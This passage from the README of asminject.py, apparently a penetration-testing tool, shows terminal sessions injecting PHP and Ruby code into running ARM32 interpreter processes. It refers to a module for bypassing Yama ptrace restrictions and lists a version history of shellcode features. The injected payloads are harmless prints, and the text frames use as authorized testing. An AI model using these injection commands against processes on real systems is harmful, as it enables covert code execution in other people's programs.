# python3 ./asminject.py 4955 execute_php_code.s --arch arm32 --relative-offsets relative_offsets-php7.3.txt --non-pic-binary "/usr/bin/php.*" --stop-method "slow" --var phpcode "echo \\\"Injected PHP code\\\n\\\";" --var phpname PHP 

[*] Handling '/usr/bin/php7.3' as non-PIC binary
...omitted for brevity...
[+] Done!
```

Back in terminal 1:

```
2022-05-16T17:08:38-0700 - Loop count 7
Injected PHP code
2022-05-16T17:08:47-0700 - Loop count 8
```

#### Injecting Ruby code into a Ruby process:

Terminal 1:

```
pi@bt-minion1:~/asminject/practice $ ruby ./ruby_loop.rb 
2022-05-16T16:03:20-07:00 - Loop count 0
2022-05-16T16:03:25-07:00 - Loop count 1
```

Terminal 2:

```
# ps auxww | grep ruby

pi       12000  4.8  0.7  22144  6756 pts/0    Sl+  16:03   0:00 ruby ./ruby_loop.rb

# python3 ./asminject.py 12000 execute_ruby_code.s --arch arm32 --relative-offsets relative_offsets-libruby2.5.5.txt --stop-method "slow" --var rubycode "puts(\\\"Injected Ruby code\\\")"

...omitted for brevity...
[+] Done!
```

Back in terminal 1:

```
2022-05-16T16:04:05-07:00 - Loop count 9
Injected Ruby code
```

### But what about Yama's ptrace_scope restrictions?

If you are an authorized administrator of a Linux system where someone has accidentally set `/proc/sys/kernel/yama/ptrace_scope` to 3, or are conducting an authorized penetration test of an environment where that value has been set, see the <a href="ptrace_scope_kernel_module/">ptrace_scope_kernel_module directory</a>.

## Version history

### 0.15 (2022-05-16)

* ARM32 `execute_python_code.s`, `execute_php_code.s`, `execute_ruby_code.s`, and `copy_file_using_syscalls.s` implemented.
* Improved set/restore of process priorities and affinities in "slow" mode
* Updated script output to use architecture-specific register names and output hex values more appropriately for architectures of different word sizes

### 0.14 (2022-05-15)

* ARM32 stage 1, stage 2 template, and `printf.s` are working!

### 0.13 (2022-05-13)

* Made asm/<architecture>/ an implicit part of the path to the stage 2 code
* Progress on ARM32 code, but not ready to use yet

### 0.12 (2022-05-12)

* Bug fixes
* Documentation updated
* ARM32 code still needs to be updated

### 0.11 (2022-05-11)

* Added `execute_precompiled.s` and `execute_precompiled_threaded.s` to allow executing inline binary shellcode once again
* Added `dlinject.s` and `dlinject_threaded.s` to emulate the original dlinject.py's ability to load Linux shared libraries into an existing process
* A validating assembly operation is now performed on the stage 2 code before any injection takes place, to avoid locking up the target process if stage 1 succeeds but stage 2 fails to assemble (due to missing parameters, etc.)
* Added `get_relative_offsets.sh` shortcut script to avoid copy/pasting long readelf one-liners
* Practice loop scripts now include date/timestamp and iteration count to make it easier to see when injection has occurred
* ARM32 code still needs to be updated

### 0.10 (2022-05-10)

* Python and Ruby injection are working again for x86-64
* PHP injection works now for x86-64
* Copy files using only syscalls and copy files using libc calls are working again for x86-64
* Most of the rearchitecture is complete
* ARM32 code has not been updated yet

### 0.8 (2022-05-06)

* Lots of things are broken
* Major rearchitecture in progress
* No longer crashes python 3 after injected code has finished, though!
* Only the printf.s shellcode is working right now

### 0.7 (2021-09-02)

* Still an internal development build
* First version to include basic support for 32-bit ARM targets
* Made all of the existing x86-64 shellcode files dependent on less specific versions of libraries, where applicable
* Various other bug fixes and enhancements

### 0.6 (2021-09-01)

* Still an internal development build
* Added Ruby injection code
* Improved reliability
* A few other bug fixes

### 0.5 (2021-08-31)

* Still an internal development build
* Added copy-file-using-libc code

### 0.4 (2021-08-31)

* Still an internal development build
* Added copy-file-using-syscalls code

### 0.3 (2021-08-30)

* Still an internal development build
* Implemented "mem" staging method

### 0.2 (2021-08-30)

* Still an internal development build
* Implemented "slow" stop method
* Implemented support for non-PIC binaries, like Python 3.x
* Various bug fixes

### 0.1 (2021-06-07)

* Internal development build
